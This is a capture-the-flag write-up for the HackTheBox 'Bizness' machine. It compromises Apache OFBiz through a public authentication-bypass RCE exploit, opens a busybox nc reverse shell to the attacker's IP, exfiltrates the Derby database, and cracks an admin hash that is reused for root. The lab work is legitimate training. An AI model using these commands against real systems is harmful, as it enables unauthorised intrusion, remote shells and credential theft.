---
layout: post
title: "HTB Bizness Writeup"
date: 2025-10-08 12:31:31 -0400
categories: hackthebox HTB-easy
tags: hacking CTF HTB HTB-easy linux derby
---
## Overview
This is an easy Linux machine on [HackTheBox](https://app.hackthebox.com/machines/Bizness){:target="_blank"}{:rel="noopener noreferrer"}. Given an IP we want to fully compromise the machine by creating a `root` shell
### Exploit Path
Through directory brute force we find the login page for `Apache OFBiz`. This version is vulnerable to **unauthenticated remote code execution** giving us a foothold onto the server and the `user.txt` flag. From the `Derby` database we can extract a password hash. The cracked password is **reused** by the `root` user, letting us login and grab the `root.txt` flag!

![htb-bizness-pwn](images/HTB-bizness/htb-bizness-pwn.png)

## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
┌──(kali@kali)-[~/bizness.htb]
└─$ rustscan --accessible -a 10.10.11.252 -- -A -sC    
Automatically increasing ulimit value to 5000.
Open 10.10.11.252:22
Open 10.10.11.252:80
Open 10.10.11.252:443
Starting Script(s)
# ...
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: 7CF35F0B3566DB84C7260F0CC357D0B8
|_http-server-header: nginx/1.18.0
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
| tls-nextprotoneg: 
|_  http/1.1
```

The webserver redirects us to the `bizness.htb` domain
```bash
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
```

Add it to our `/etc/hosts` file
```bash
<MACHINE_IP> bizness.htb
```

### Sub Domains
No results
```bash
┌──(kali@kali)-[~/bizness.htb]
└─$ wfuzz -c -t 50 -u http://bizness.htb -H 'Host: FUZZ.bizness.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 11
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bizness.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================


Total time: 0
Processed Requests: 114442
Filtered Requests: 114442
Requests/sec.: 0
```

### Directory Bruteforce
We're redirected to an interesting page
```bash
┌──(kali@kali)-[~/bizness.htb]
└─$ dirsearch -w /usr/share/wordlists/dirb/big.txt -r -f --threads=100 --url=bizness.htb --output=dirsearch-ext.txt -e txt,php,html,js,md

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: txt, php, html, js, md | HTTP method: GET | Threads: 100 | Wordlist size: 143095

Output File: dirsearch-ext.txt

Target: https://bizness.htb/

[21:52:20] Starting: 
[21:53:09] 404 -  682B  - /META-INF
[21:53:09] 404 -  682B  - /META-INF/
[21:53:13] 404 -  682B  - /WEB-INF/
[21:53:13] 404 -  682B  - /WEB-INF
[21:53:34] 302 -    0B  - /accounting/  ->  https://bizness.htb/accounting/control/main
[21:53:34] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
Added to the queue: accounting/
# ...
```

### Apache OFBiz
Visiting the `https://bizness.htb/accounting` endpoint redirects us to a login page for `Apache OFBiz`. At the bottom we're given a version

![htb-bizness-apache-ofbiz](images/HTB-bizness/htb-bizness-apache-ofbiz.png)

## user.txt
Looking up the version we find an [authentication bypass exploit](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass){:target="_blank"}{:rel="noopener noreferrer"}
```bash
┌──(kali@kali)-[~/bizness.htb/Apache-OFBiz-Authentication-Bypass]
└─$ python3 exploit.py --url https://bizness.htb                        
[+] Scanning started...
[+] Apache OFBiz instance seems to be vulnerable.
```

We can test command execution by having the machine ping our web server
```bash
┌──(kali@kali)-[~/bizness.htb/Apache-OFBiz-Authentication-Bypass]
└─$ python3 exploit.py --url https://bizness.htb/ --cmd "wget http://10.10.14.17/rce-callback"
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```
> We're using `https` instead of `http` here!
{: .prompt-tip }

```bash
┌──(kali@kali)-[~/server]
└─$ python3 -m http.server 80                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.252 - - [07/Oct/2025 22:19:48] "GET /rce-callback HTTP/1.1" 404 -
```

We have **remote code execution** so let's send a [reverse shell](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}
```bash
┌──(kali@kali)-[~/bizness.htb/Apache-OFBiz-Authentication-Bypass]
└─$ python3 exploit.py --url https://bizness.htb/ --cmd "busybox nc 10.10.14.17 4444 -e /bin/bash"
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```bash
┌──(kali@kali)-[~/bizness.htb]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.252] 59940
id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
which python3
/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
zsh: suspended  nc -lvnp 4444
┌──(kali@kali)-[~/bizness.htb]
└─$ stty raw -echo && fg
[1]  + continued  nc -lvnp 4444
ofbiz@bizness:/opt/ofbiz$ export SHELL=/bin/bash
ofbiz@bizness:/opt/ofbiz$ export TERM=screen
```

We're the `ofbiz` user and can grab the `user.txt` flag!
```bash
ofbiz@bizness:~$ id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
ofbiz@bizness:~$ cat user.txt
```

![htb-bizness-user-txt](images/HTB-bizness/htb-bizness-user-txt.png)
## root.txt
The `/opt/ofbiz` directory is interesting and contains a lot of files. Let's try to find some database credentials

We know it's running `Apache OFBiz`. According to the [documentation](https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide#ApacheOFBizTechnicalProductionSetupGuide-DatabaseSetup){:target="_blank"}{:rel="noopener noreferrer"} the default database is called `Derby`. Let's search for it
```bash
ofbiz@bizness:/opt/ofbiz$ grep -ri 'derby.properties'
grep: runtime/data/derby/ofbiz/seg0/c230.dat: binary file matches
grep: runtime/data/derby/ofbizolap/seg0/c230.dat: binary file matches
grep: runtime/data/derby/ofbizolap/log/log1.dat: binary file matches
grep: runtime/data/derby/ofbiztenant/seg0/c230.dat: binary file matches
grep: runtime/data/derby/ofbiztenant/log/log1.dat: binary file matches
build.gradle:    doLast { deleteAllInDirWithExclusions("${rootDir}/runtime/data/", ['README', 'derby.properties']) }
```

The `derby` home directory is `/opt/ofbiz/runtime/data/derby`! The docs tell us that [the database exists in the filesystem](https://db.apache.org/derby/docs/10.0/manuals/develop/develop13.html){:target="_blank"}{:rel="noopener noreferrer"}. We should exfiltrate this folder and read it on our machine
```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ tar -czvf derby.tar.gz derby
```

We can setup a `python` server on port `9999` and download it to our machine
```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.10.14.17 - - [08/Oct/2025 01:13:24] "GET /derby.tar.gz HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

```bash
┌──(kali@kali)-[~/bizness.htb]
└─$ wget http://bizness.htb:9999/derby.tar.gz
--2025-10-08 01:13:26--  http://bizness.htb:9999/derby.tar.gz
```

Decompress the archive and install the `derby-tools` package
```bash
┌──(kali@kali)-[~/bizness.htb]
└─$ tar xf derby.tar.gz  

┌──(kali@kali)-[~/bizness.htb]
└─$ cd derby

┌──(kali@kali)-[~/bizness.htb/derby]
└─$ sudo apt-get install derby-tools
```

Let's read the database with `ij`
```bash
┌──(kali@kali)-[~/bizness.htb/derby]
└─$ ls
derby.log  ofbiz  ofbizolap  ofbiztenant

┌──(kali@kali)-[~/bizness.htb/derby]
└─$ ij
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ij version 10.14
ij> connect 'jdbc:derby:ofbiz';
ij> show tables;
TABLE_SCHEM         |TABLE_NAME                    |REMARKS             
------------------------------------------------------------------------
SYS                 |SYSALIASES                    |                    
# ...
OFBIZ               |USER_LOGIN                    |
# ...
ij> select user_login_id, current_password from ofbiz.user_login;
USER_LOGIN_ID                                                                                                                   |CURRENT_PASSWORD                                                                                                                
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
system                                                                                                                          |NULL
anonymous                                                                                                                       |NULL
admin                                                                                                                           |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I   
```

Doing research we can find [this repo](https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker){:target="_blank"}{:rel="noopener noreferrer"} which can crack our hash. Clone it and run the script
```bash
┌──(kali@kali)-[~/bizness.htb/Apache-OFBiz-SHA1-Cracker]
└─$ python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
[+] Attempting to crack....
Found Password: <PASSWORD_REDACTED>
hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
(Attempts: 1478438)
[!] Super, I bet you could log into something with that!
```

This password can be reused to login as `root` and grab the `root.txt` flag
```bash
ofbiz@bizness:~$ su root
Password: 
root@bizness:/home/ofbiz# id
uid=0(root) gid=0(root) groups=0(root)
root@bizness:/home/ofbiz# cat ~/root.txt
```

![htb-bizness-root-txt](images/HTB-bizness/htb-bizness-root-txt.png)
